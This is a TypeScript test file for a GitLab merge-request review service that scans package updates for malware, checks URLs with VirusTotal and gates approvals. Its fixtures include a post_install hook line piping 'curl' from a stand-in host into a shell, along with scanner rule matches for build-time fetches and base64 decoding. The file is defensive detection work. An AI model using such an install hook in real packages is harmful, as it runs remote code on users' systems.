import { type MergeRequestWithDiffs } from '@chaotic-next/shared-lib';
import { type PinoLogger } from 'nestjs-pino';
import type { Repository } from 'typeorm';
import { describe, expect, it, vi } from 'vitest';
import { sendNotification } from 'web-push';
import { DiffScanService } from '../diff-scan/diff-scan.service';
import { NotificationSubscription } from '../notifications/notification-subscription.entity';
import { GitlabApiService } from './gitlab-api.service';
import { GitlabMergeRequestService } from './gitlab-merge-request.service';
import { MrAction } from './mr-action.entity';

vi.mock('web-push', () => ({ PushSubscription: {}, sendNotification: vi.fn() }));

const ACTOR = { userId: 'test-user', userName: 'Test User' };

function createApiService(api: Record<string, unknown> = {}): GitlabApiService {
  const service = new GitlabApiService(
    {
      info: () => undefined,
      warn: () => undefined,
      error: () => undefined,
      debug: () => undefined,
    } as unknown as PinoLogger,
    { get: vi.fn(), getOrThrow: vi.fn().mockReturnValue(12345) } as never,
    { findOne: vi.fn().mockResolvedValue({ gitlabProjectId: 'test-project-id' }) } as unknown as Repository<never>,
  );
  (service as unknown as { chaoticId: string }).chaoticId = 'test-project-id';
  (service as unknown as { api: unknown }).api = api;
  return service;
}

function createService(
  apiObject: Record<string, unknown> = {},
  virustotal: { enabled: boolean; reportOn: ReturnType<typeof vi.fn> } = { enabled: false, reportOn: vi.fn() },
  aurScan: { maintainerStatusFor: ReturnType<typeof vi.fn> } = {
    maintainerStatusFor: vi.fn(async () => new Map()),
  },
  subscriptions: unknown[] = [],
): {
  service: GitlabMergeRequestService;
  apiService: GitlabApiService;
  mrActionRepository: { insert: ReturnType<typeof vi.fn>; find: ReturnType<typeof vi.fn> };
  mrEdit: ReturnType<typeof vi.fn>;
  noteCreate: ReturnType<typeof vi.fn>;
  discussionsCreate: ReturnType<typeof vi.fn>;
  cacheSet: ReturnType<typeof vi.fn>;
  cacheGet: ReturnType<typeof vi.fn>;
  sseNext: ReturnType<typeof vi.fn>;
  vtReportOn: ReturnType<typeof vi.fn>;
  maintainerStatusFor: ReturnType<typeof vi.fn>;
} {
  const mrEdit = vi.fn().mockResolvedValue({});
  const noteCreate = vi.fn().mockResolvedValue({});
  const discussionsCreate = vi.fn().mockResolvedValue({});
  const cacheSet = vi.fn();
  const cacheGet = vi.fn();
  const sseNext = vi.fn();
  const mrActionRepository = { insert: vi.fn(), find: vi.fn() };

  const apiService = createApiService({
    MergeRequests: { edit: mrEdit },
    MergeRequestNotes: { create: noteCreate },
    MergeRequestDiscussions: { create: discussionsCreate },
    ...apiObject,
  });

  const service = new GitlabMergeRequestService(
    { get: cacheGet, set: cacheSet, del: vi.fn() } as never,
    {
      info: () => undefined,
      warn: () => undefined,
      error: () => undefined,
      debug: () => undefined,
    } as unknown as PinoLogger,
    apiService,
    new DiffScanService({
      info: () => undefined,
      warn: () => undefined,
      error: () => undefined,
      debug: () => undefined,
    } as unknown as PinoLogger),
    virustotal as never,
    aurScan as never,
    { sseEvents$: { next: sseNext } } as never,
    { find: vi.fn().mockResolvedValue(subscriptions) } as unknown as Repository<NotificationSubscription>,
    mrActionRepository as unknown as Repository<MrAction>,
  );
  return {
    service,
    apiService,
    mrActionRepository,
    mrEdit,
    noteCreate,
    discussionsCreate,
    cacheSet,
    cacheGet,
    sseNext,
    vtReportOn: virustotal.reportOn,
    maintainerStatusFor: aurScan.maintainerStatusFor,
  };
}

function mr(overrides: Partial<MergeRequestWithDiffs>): MergeRequestWithDiffs {
  return {
    id: 1,
    iid: 1,
    title: 'chore(update): testpkg',
    state: 'opened',
    web_url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/1',
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    assignees: [],
    sha: 'abc123',
    merge_status: 'can_be_merged',
    detailed_merge_status: 'not_approved',
    labels: ['human-review'],
    diffs: [],
    ...overrides,
  };
}

describe('GitlabMergeRequestService.autoFlagMergeRequests', () => {
  const criticalFinding = {
    ruleId: 'NPM-001',
    ruleName: 'Package manager fetch at build/install time',
    severity: 'critical',
    description: 'desc',
    file: 'testpkg/testpkg.install',
    line: 3,
    match: 'npm install atomic-lockfile',
  } as const;

  it('adds the malware label, anchors findings as line comments and posts a summary note', async () => {
    const { service, mrEdit, noteCreate, discussionsCreate, cacheSet, sseNext } = createService();
    const flagged = mr({
      diff_refs: { base_sha: 'base', head_sha: 'head', start_sha: 'start' },
      scanFindings: [criticalFinding],
    });

    await service.autoFlagMergeRequests([flagged, mr({ title: 'chore(update): cleanpkg' })]);

    expect(mrEdit).toHaveBeenCalledTimes(1);
    expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'malware' });
    expect(discussionsCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('NPM-001'), {
      position: {
        positionType: 'text',
        baseSha: 'base',
        startSha: 'start',
        headSha: 'head',
        oldPath: 'testpkg/testpkg.install',
        newPath: 'testpkg/testpkg.install',
        newLine: '3',
      },
    });
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('malware'));
    expect(flagged.labels).toContain('malware');
    expect(cacheSet).toHaveBeenCalledTimes(1);
    expect(sseNext).toHaveBeenCalledTimes(1);
  });

  it('keeps findings in the summary note when the MR has no diff refs', async () => {
    const { service, noteCreate, discussionsCreate } = createService();

    await service.autoFlagMergeRequests([mr({ diff_refs: null, scanFindings: [criticalFinding] })]);

    expect(discussionsCreate).not.toHaveBeenCalled();
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('NPM-001'));
  });

  it('skips MRs that already carry the verdict label or a stronger one', async () => {
    const { service, mrEdit } = createService();
    const warning = {
      ruleId: 'OBF-001',
      ruleName: 'Base64 decoding',
      severity: 'warning',
      description: 'desc',
      file: 'testpkg/PKGBUILD',
      match: 'base64 -d',
    } as const;

    await service.autoFlagMergeRequests([
      mr({ labels: ['human-review', 'suspicious'], scanFindings: [warning, warning] }),
      mr({ labels: ['human-review', 'malware'], scanFindings: [warning, warning] }),
    ]);

    expect(mrEdit).not.toHaveBeenCalled();
  });

  it('leaves MRs without notable findings alone', async () => {
    const { service, mrEdit, cacheSet } = createService();
    const info = {
      ruleId: 'NET-001',
      ruleName: 'Unencrypted HTTP URL',
      severity: 'info',
      description: 'desc',
      file: 'testpkg/PKGBUILD',
      match: 'http://',
    } as const;

    await service.autoFlagMergeRequests([mr({ scanFindings: [info] })]);

    expect(mrEdit).not.toHaveBeenCalled();
    expect(cacheSet).not.toHaveBeenCalled();
  });
});

describe('GitlabMergeRequestService.enrichVirusTotalReports', () => {
  const criticalFinding = {
    ruleId: 'DLE-001',
    ruleName: 'Curl piped into a shell',
    severity: 'critical',
    description: 'desc',
    file: 'testpkg/testpkg.install',
    line: 2,
    match: 'curl -s https://evil.example/payload | sh',
  } as const;

  const flaggedMr = (): MergeRequestWithDiffs =>
    mr({
      diffs: [
        {
          old_path: 'testpkg/testpkg.install',
          new_path: 'testpkg/testpkg.install',
          a_mode: '100644',
          b_mode: '100644',
          new_file: true,
          renamed_file: false,
          deleted_file: false,
          diff: ['@@ -0,0 +1,2 @@', '+post_install() {', '+  curl -s https://evil.example/payload | sh'].join('\n'),
        },
      ],
      scanFindings: [criticalFinding],
    });

  const maliciousReport = {
    type: 'url',
    value: 'https://evil.example/payload',
    context: 'testpkg/testpkg.install:2',
    verdict: 'malicious',
    stats: { malicious: 5, suspicious: 1, undetected: 40, harmless: 20, timeout: 0 },
  } as const;

  const enrich = (service: GitlabMergeRequestService, mrs: MergeRequestWithDiffs[]): Promise<void> =>
    (
      service as unknown as {
        enrichVirusTotalReports: (mrs: MergeRequestWithDiffs[]) => Promise<void>;
      }
    ).enrichVirusTotalReports(mrs);

  it('attaches reports, refreshes the cache and posts a note for notable verdicts', async () => {
    const reportOn = vi.fn().mockResolvedValue([maliciousReport]);
    const { service, noteCreate, cacheSet, sseNext } = createService({}, { enabled: true, reportOn });
    const flagged = flaggedMr();

    await enrich(service, [flagged]);

    expect(reportOn).toHaveBeenCalledTimes(1);
    expect(reportOn.mock.calls[0]?.[0]).toEqual([
      { type: 'url', value: 'https://evil.example/payload', context: 'testpkg/testpkg.install:2' },
    ]);
    expect(flagged.vtReports).toEqual([maliciousReport]);
    expect(cacheSet).toHaveBeenCalledTimes(1);
    expect(sseNext).toHaveBeenCalledTimes(1);
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('VirusTotal'));
  });

  it('posts only one note per MR across repeated cron cycles', async () => {
    const reportOn = vi.fn().mockResolvedValue([maliciousReport]);
    const { service, noteCreate } = createService({}, { enabled: true, reportOn });
    const flagged = flaggedMr();

    await enrich(service, [flagged]);
    flagged.vtReports = undefined;
    await enrich(service, [flagged]);

    expect(noteCreate).toHaveBeenCalledTimes(1);
  });

  it('skips MRs without scan findings and stays inert when no API key is configured', async () => {
    const enabled = createService({}, { enabled: true, reportOn: vi.fn() });
    const disabled = createService();

    await enrich(enabled.service, [mr({ title: 'chore(update): cleanpkg' })]);
    await enrich(disabled.service, [flaggedMr()]);

    expect(enabled.vtReportOn).not.toHaveBeenCalled();
    expect(disabled.vtReportOn).not.toHaveBeenCalled();
    expect(enabled.cacheSet).not.toHaveBeenCalled();
  });
});

describe('GitlabMergeRequestService.getOpenMergeRequests', () => {
  const mrSchema = (iid: number): Record<string, unknown> => ({
    id: iid,
    iid,
    title: `chore(update): pkg${iid}`,
    state: 'opened',
    web_url: `https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/${iid}`,
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    assignees: [],
    sha: 'abc123',
    labels: [],
    merge_status: 'can_be_merged',
    detailed_merge_status: 'not_approved',
    diff_refs: null,
  });

  const diffEntry = {
    old_path: 'pkg/PKGBUILD',
    new_path: 'pkg/PKGBUILD',
    a_mode: '100644',
    b_mode: '100644',
    new_file: false,
    renamed_file: false,
    deleted_file: false,
    diff: '@@ -1,2 +1,2 @@\n pkgver=1.0\n pkgrel=2',
  };

  it('fetches diffs in bounded batches and keeps going when one MR diff fails', async () => {
    const { service, apiService, cacheSet } = createService();
    const all = vi.fn().mockResolvedValue([mrSchema(1), mrSchema(2)]);
    const allDiffs = vi
      .fn()
      .mockImplementation((projectId: string, iid: number) =>
        iid === 2 ? Promise.reject(new Error('500 Internal Server Error')) : Promise.resolve([diffEntry]),
      );
    (apiService as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };

    const data = await service.getOpenMergeRequests(true);

    expect(allDiffs).toHaveBeenCalledTimes(2);
    expect(data[0]?.diffs).toEqual([diffEntry]);
    expect(data[0]?.scanFindings).toEqual([]);
    expect(data[1]?.diffs).toEqual([]);
    expect(data[1]?.scanFindings).toEqual([]);
    expect(cacheSet).toHaveBeenCalledTimes(1);
  });

  it('serves cached MRs without touching the GitLab API', async () => {
    const { service, apiService, cacheSet } = createService();
    const cached: MergeRequestWithDiffs[] = [mr({ title: 'chore(update): cachedpkg' })];
    (service as unknown as { cacheManager: unknown }).cacheManager = {
      get: vi.fn().mockResolvedValue(cached),
      set: cacheSet,
      del: vi.fn(),
    };
    const all = vi.fn();
    (apiService as unknown as { api: unknown }).api = { MergeRequests: { all } };

    const data = await service.getOpenMergeRequests(false);

    expect(data).toBe(cached);
    expect(all).not.toHaveBeenCalled();
    expect(cacheSet).not.toHaveBeenCalled();
  });

  it('reuses cached diffs and scan findings for MRs whose revision did not move', async () => {
    const { service, apiService, cacheSet } = createService();
    const firstMr = mrSchema(1);
    const secondMr = mrSchema(2);
    const all = vi
      .fn()
      .mockResolvedValueOnce([firstMr, secondMr])
      .mockResolvedValueOnce([firstMr, { ...secondMr, updated_at: '2026-01-02T00:00:00Z' }]);
    const allDiffs = vi.fn().mockResolvedValue([diffEntry]);
    (apiService as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };

    const first = await service.getOpenMergeRequests(true);
    const second = await service.getOpenMergeRequests(true);

    expect(allDiffs).toHaveBeenCalledTimes(3);
    expect(allDiffs).toHaveBeenNthCalledWith(1, 'test-project-id', 1);
    expect(allDiffs).toHaveBeenNthCalledWith(2, 'test-project-id', 2);
    expect(allDiffs).toHaveBeenNthCalledWith(3, 'test-project-id', 2);

    expect(second[0]?.diffs).toBe(first[0]?.diffs);
    expect(second[0]?.scanFindings).toBe(first[0]?.scanFindings);
    expect(second[1]?.scanFindings).not.toBe(first[1]?.scanFindings);
    expect(cacheSet).toHaveBeenCalledTimes(2);
  });

  it('carries VirusTotal reports and maintainer info over to a rebuilt snapshot', async () => {
    const { service, apiService, cacheSet } = createService();
    const all = vi.fn().mockResolvedValue([mrSchema(1)]);
    const allDiffs = vi.fn().mockResolvedValue([diffEntry]);
    (apiService as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };
    const previous: MergeRequestWithDiffs[] = [
      mr({
        vtReports: [
          {
            type: 'url',
            value: 'https://evil.example/payload',
            context: 'testpkg/testpkg.install:2',
            verdict: 'malicious',
          },
        ],
        maintainers: [{ username: 'stranger', packagesMaintained: 1, totalVotes: 0, registeredDate: '', novice: true }],
      }),
    ];
    (service as unknown as { cacheManager: unknown }).cacheManager = {
      get: vi.fn().mockResolvedValue(previous),
      set: cacheSet,
      del: vi.fn(),
    };

    const data = await service.getOpenMergeRequests(true);

    expect(data[0]?.vtReports).toEqual(previous[0]?.vtReports);
    expect(data[0]?.maintainers).toEqual(previous[0]?.maintainers);
  });
});

describe('GitlabMergeRequestService.approveMergeRequest', () => {
  it('approves MR on GitLab but defers merge execution while scheduled pipeline is running', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review'] });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    setApi(service, {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    vi.useFakeTimers();

    // 03:35 UTC - inside scheduled pipeline window
    vi.setSystemTime(new Date('2026-08-21T03:35:00Z'));
    try {
      const result = await service.approveMergeRequest(1, 'abc123', ACTOR);
      expect(result).toEqual({ deferred: true });
      expect(approvalsApprove).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
      expect(mrAccept).not.toHaveBeenCalled();
      expect(mrActionInsert).toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it('broadcasts the approved MR over SSE when the merge is deferred', async () => {
    const { service, cacheGet, sseNext } = createService();
    cacheGet.mockResolvedValue([
      {
        id: 1,
        iid: 1,
        title: 'chore(update): moon',
        labels: ['human-review'],
        diffs: [],
        scanFindings: [],
      },
    ]);
    const show = vi.fn().mockResolvedValue({
      id: 1,
      iid: 1,
      sha: 'abc123',
      labels: ['human-review'],
      title: 'chore(update): moon',
    });
    setApi(service, {
      MergeRequests: { show, edit: vi.fn().mockResolvedValue({}), accept: vi.fn() },
      MergeRequestApprovals: { approve: vi.fn().mockResolvedValue({}) },
      MergeRequestNotes: { create: vi.fn().mockResolvedValue({}) },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: vi.fn() };

    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-21T03:35:00Z'));
    try {
      const result = await service.approveMergeRequest(1, 'abc123', ACTOR);
      expect(result).toEqual({ deferred: true });

      expect(sseNext).toHaveBeenCalledTimes(1);
      const event = sseNext.mock.calls[0][0] as {
        data: { type: string; mr: MergeRequestWithDiffs[]; hasNewMr: boolean };
      };
      expect(event.data.type).toBe('merge_request');
      expect(event.data.hasNewMr).toBe(false);
      expect(event.data.mr[0].labels).toEqual(['human-review', 'approved']);
    } finally {
      vi.useRealTimers();
    }
  });

  it('broadcasts the already-merged MR over SSE', async () => {
    const { service, cacheGet, sseNext } = createService();
    cacheGet.mockResolvedValue([
      {
        id: 1,
        iid: 1,
        title: 'chore(update): moon',
        labels: ['human-review'],
        diffs: [],
        scanFindings: [],
      },
    ]);
    const show = vi.fn().mockResolvedValue({
      id: 1,
      iid: 1,
      sha: 'abc123',
      labels: ['human-review'],
      title: 'chore(update): moon',
    });
    const mrAccept = vi.fn().mockResolvedValue({});
    setApi(service, {
      MergeRequests: { show, edit: vi.fn().mockResolvedValue({}), accept: mrAccept },
      MergeRequestApprovals: { approve: vi.fn().mockResolvedValue({}) },
      MergeRequestNotes: { create: vi.fn().mockResolvedValue({}) },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: vi.fn() };

    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
    try {
      await service.approveMergeRequest(1, 'abc123', ACTOR);
      expect(mrAccept).toHaveBeenCalled();

      expect(sseNext).toHaveBeenCalledTimes(1);
      const event = sseNext.mock.calls[0][0] as {
        data: { type: string; mr: MergeRequestWithDiffs[]; hasNewMr: boolean };
      };
      expect(event.data.type).toBe('merge_request');
      expect(event.data.hasNewMr).toBe(false);
      expect(event.data.mr[0].labels).toEqual(['human-review', 'approved']);
    } finally {
      vi.useRealTimers();
    }
  });

  it('refuses to approve MRs the scan flagged as malware', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review', 'malware'] });
    const approvalsApprove = vi.fn().mockResolvedValue({});
    setApi(service, {
      MergeRequests: { show, edit: vi.fn() },
      MergeRequestApprovals: { approve: approvalsApprove },
    });

    await expect(service.approveMergeRequest(1, 'abc123', ACTOR)).rejects.toThrow('malware');
    expect(approvalsApprove).not.toHaveBeenCalled();
  });

  it('approves regular MRs, posts comment, records action, and merges', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review'] });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    setApi(service, {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    vi.useFakeTimers();
    // 03:00 UTC - outside scheduled pipeline window
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
    try {
      await service.approveMergeRequest(1, 'abc123', ACTOR);

      expect(approvalsApprove).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
      expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'approved' });
      expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, '**✅ Approved by** Test User.');
      expect(mrActionInsert).toHaveBeenCalledWith({
        mergeRequestIid: 1,
        action: 'approve',
        commitSha: 'abc123',
        ...ACTOR,
      });
      expect(mrAccept).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
    } finally {
      vi.useRealTimers();
    }
  });

  it('never rebases and reports a descriptive error for unmergeable MRs', async () => {
    const { service } = createService();
    const show = vi
      .fn()
      .mockResolvedValueOnce({ iid: 1, sha: 'abc123', labels: ['human-review'] })
      .mockResolvedValueOnce({
        iid: 1,
        sha: 'abc123',
        merge_status: 'cannot_be_merged',
        detailed_merge_status: 'broken_status',
      });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockRejectedValueOnce(new Error('Branch cannot be merged')).mockResolvedValue({});
    const mrRebase = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const allDiffs = vi.fn().mockResolvedValue([{ new_path: 'moon/PKGBUILD' }]);
    setApi(service, {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept, rebase: mrRebase, allDiffs },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: vi.fn() };

    vi.useFakeTimers();
    // 03:00 UTC - outside scheduled pipeline window
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
    try {
      await expect(service.approveMergeRequest(1, 'abc123', ACTOR)).rejects.toThrow('Cannot merge MR !1');
      expect(mrRebase).not.toHaveBeenCalled();
      expect(mrAccept).toHaveBeenCalledTimes(1);
    } finally {
      vi.useRealTimers();
    }
  });

  it.each(['ci_still_running', 'ci_must_pass', 'commits_status'])(
    'reports a terminal blocker for %s because MRs in this project have no pipelines',
    async (detailedMergeStatus) => {
      const { service } = createService();
      const show = vi
        .fn()
        .mockResolvedValueOnce({ iid: 1, sha: 'abc123', labels: ['human-review'] })
        .mockResolvedValueOnce({
          iid: 1,
          sha: 'abc123',
          merge_status: 'can_be_merged',
          detailed_merge_status: detailedMergeStatus,
        });
      const mrAccept = vi.fn().mockRejectedValue(new Error('405 Method Not Allowed'));
      const mrRebase = vi.fn().mockResolvedValue({});
      const allDiffs = vi.fn().mockResolvedValue([{ new_path: 'moon/PKGBUILD' }]);
      setApi(service, {
        MergeRequests: { show, edit: vi.fn().mockResolvedValue({}), accept: mrAccept, rebase: mrRebase, allDiffs },
        MergeRequestApprovals: { approve: vi.fn().mockResolvedValue({}) },
        MergeRequestNotes: { create: vi.fn().mockResolvedValue({}) },
      });
      (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: vi.fn() };

      vi.useFakeTimers();
      vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
      try {
        await expect(service.approveMergeRequest(1, 'abc123', ACTOR)).rejects.toThrow('Cannot merge MR !1');
        expect(mrRebase).not.toHaveBeenCalled();
        expect(mrAccept).toHaveBeenCalledTimes(1);
      } finally {
        vi.useRealTimers();
      }
    },
  );

  it('closes an MR that no longer contains changes against its target branch', async () => {
    const { service } = createService();
    const show = vi
      .fn()
      .mockResolvedValueOnce({ iid: 1, sha: 'fc7085b2', labels: ['human-review', 'approved'] })
      .mockResolvedValue({
        iid: 1,
        sha: 'fc7085b2',
        merge_status: 'can_be_merged',
        detailed_merge_status: 'mergeable',
      });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockRejectedValue(new Error('405 Method Not Allowed'));
    const noteCreate = vi.fn().mockResolvedValue({});
    const allDiffs = vi.fn().mockResolvedValue([]);
    setApi(service, {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept, rebase: vi.fn(), allDiffs },
      MergeRequestApprovals: { approve: vi.fn().mockResolvedValue({}) },
      MergeRequestNotes: { create: noteCreate },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: vi.fn() };

    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));

    try {
      await expect(service.approveMergeRequest(1, 'fc7085b2', ACTOR)).rejects.toThrow('contains no changes');
      expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { stateEvent: 'close' });
      expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('Closed automatically'));
      expect(allDiffs).toHaveBeenCalledWith('test-project-id', 1);
    } finally {
      vi.useRealTimers();
    }
  });

  it('labels, comments, and records the approval right away even when the merge fails', async () => {
    const { service } = createService();
    const show = vi
      .fn()
      .mockResolvedValueOnce({ iid: 1, sha: 'abc123', labels: ['human-review'] })
      .mockResolvedValue({
        iid: 1,
        sha: 'abc123',
        merge_status: 'can_be_merged',
        detailed_merge_status: 'blocked_status',
      });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockRejectedValue(new Error('405 Method Not Allowed'));
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    setApi(service, {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept },
      MergeRequestApprovals: { approve: vi.fn().mockResolvedValue({}) },
      MergeRequestNotes: { create: noteCreate },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));

    try {
      await expect(service.approveMergeRequest(1, 'abc123', ACTOR)).rejects.toThrow('Cannot merge MR !1');
      expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'approved' });
      expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, '**✅ Approved by** Test User.');
      expect(mrActionInsert).toHaveBeenCalledWith({
        mergeRequestIid: 1,
        action: 'approve',
        commitSha: 'abc123',
        ...ACTOR,
      });
    } finally {
      vi.useRealTimers();
    }
  });
});

function setApi(service: GitlabMergeRequestService, api: Record<string, unknown>): void {
  const apiService = (service as unknown as { gitlabApiService: { api: unknown } }).gitlabApiService;
  apiService.api = api;
}

describe('GitlabMergeRequestService.processDeferredMerges', () => {
  function deferredSetup() {
    const { service } = createService();
    const mrAccept = vi.fn().mockRejectedValue(new Error('405 Method Not Allowed'));
    const noteCreate = vi.fn().mockResolvedValue({});
    const show = vi.fn().mockResolvedValue({
      iid: 7,
      sha: 'sha7',
      merge_status: 'can_be_merged',
      detailed_merge_status: 'blocked_status',
    });
    const mrAll = vi.fn().mockResolvedValue([{ iid: 7, sha: 'sha7', labels: [] }]);
    setApi(service, {
      MergeRequests: { show, accept: mrAccept, rebase: vi.fn(), all: mrAll },
      MergeRequestNotes: { create: noteCreate },
    });
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = {
      find: vi.fn().mockResolvedValue([{ mergeRequestIid: 7, commitSha: 'sha7', createdAt: new Date() }]),
    };
    return { service, mrAccept, noteCreate };
  }

  it('stops retrying a deferred merge after repeated failures and leaves a warning note', async () => {
    const { service, mrAccept, noteCreate } = deferredSetup();

    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
    try {
      for (let attempt = 0; attempt < 5; attempt++) {
        await service.processDeferredMerges();
      }
      expect(mrAccept).toHaveBeenCalledTimes(5);

      await service.processDeferredMerges();

      expect(mrAccept).toHaveBeenCalledTimes(5);
      expect(noteCreate).toHaveBeenCalledWith(
        'test-project-id',
        7,
        expect.stringContaining('must merge this merge request manually'),
      );
    } finally {
      vi.useRealTimers();
    }
  });

  it('skips deferred merges for MRs labeled malware', async () => {
    const { service, mrAccept } = deferredSetup();
    const mrAll = vi.fn().mockResolvedValue([{ iid: 7, sha: 'sha7', labels: ['human-review', 'malware'] }]);
    setApi(service, { MergeRequests: { all: mrAll } });

    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));

    try {
      await service.processDeferredMerges();
      expect(mrAccept).not.toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('GitlabMergeRequestService.enrichMaintainerInfo', () => {
  const strangerStatus = {
    maintainers: [
      {
        username: 'stranger',
        packagesMaintained: 1,
        totalVotes: 0,
        oldestFirstSubmitted: new Date().toISOString(),
        novice: true,
      },
    ],
    meta: { votes: 3, popularity: 0.5, firstSubmitted: '', outOfDate: false, orphaned: false },
    change: {
      previous: ['oldmaintainer'],
      added: ['stranger'],
      removed: ['oldmaintainer'],
      detectedAt: new Date().toISOString(),
    },
  };

  function enrich(service: GitlabMergeRequestService) {
    return (service as unknown as { enrichMaintainerInfo(mrs: MergeRequestWithDiffs[]): Promise<void> })
      .enrichMaintainerInfo;
  }

  it('attaches maintainers and takeover changes to update MRs', async () => {
    const maintainerStatusFor = vi.fn(async () => new Map([['evilpkg', strangerStatus]]));
    const { service, cacheSet, sseNext } = createService({}, undefined, { maintainerStatusFor });
    const updateMr = mr({ title: 'chore(update): evilpkg' });
    const otherMr = mr({ title: 'chore: mass rebuild', iid: 2, id: 99 });

    await enrich(service).call(service, [updateMr, otherMr]);

    expect(maintainerStatusFor).toHaveBeenCalledTimes(1);
    expect(maintainerStatusFor).toHaveBeenCalledWith(['evilpkg']);
    expect(updateMr.maintainers?.[0]?.username).toBe('stranger');
    expect(updateMr.maintainerChange?.added).toEqual(['stranger']);
    expect(otherMr.maintainers).toBeUndefined();
    expect(cacheSet).toHaveBeenCalled();
    expect(sseNext).toHaveBeenCalled();
  });

  it('skips MRs whose updated_at has not changed since the last run', async () => {
    const maintainerStatusFor = vi.fn(async () => new Map([['evilpkg', strangerStatus]]));
    const { service } = createService({}, undefined, { maintainerStatusFor });
    const updateMr = mr({ title: 'chore(update): evilpkg', updated_at: '2026-08-16T10:00:00Z' });

    await enrich(service).call(service, [updateMr]);
    await enrich(service).call(service, [{ ...updateMr, maintainers: undefined, maintainerChange: undefined }]);
    expect(maintainerStatusFor).toHaveBeenCalledTimes(1);

    const pushedMr = {
      ...updateMr,
      updated_at: '2026-08-16T12:00:00Z',
      maintainers: undefined,
      maintainerChange: undefined,
    };
    await enrich(service).call(service, [pushedMr]);
    expect(maintainerStatusFor).toHaveBeenCalledTimes(2);
    expect(maintainerStatusFor).toHaveBeenLastCalledWith(['evilpkg']);
  });
});

function mrFixture(iid: number, overrides: Partial<MergeRequestWithDiffs> = {}): MergeRequestWithDiffs {
  return {
    id: iid,
    iid,
    title: `chore(update): pkg${iid}`,
    labels: [],
    diffs: [{ diff: '+code' } as never],
    scanFindings: [],
    ...overrides,
  } as unknown as MergeRequestWithDiffs;
}

type NotifyAccess = {
  notifySubscribers(mrs: MergeRequestWithDiffs[]): Promise<void>;
  flushDeferredNotifications(): Promise<void>;
  pendingNotificationIids: Set<number>;
};

function notificationAccess(service: GitlabMergeRequestService): NotifyAccess {
  return service as unknown as NotifyAccess;
}

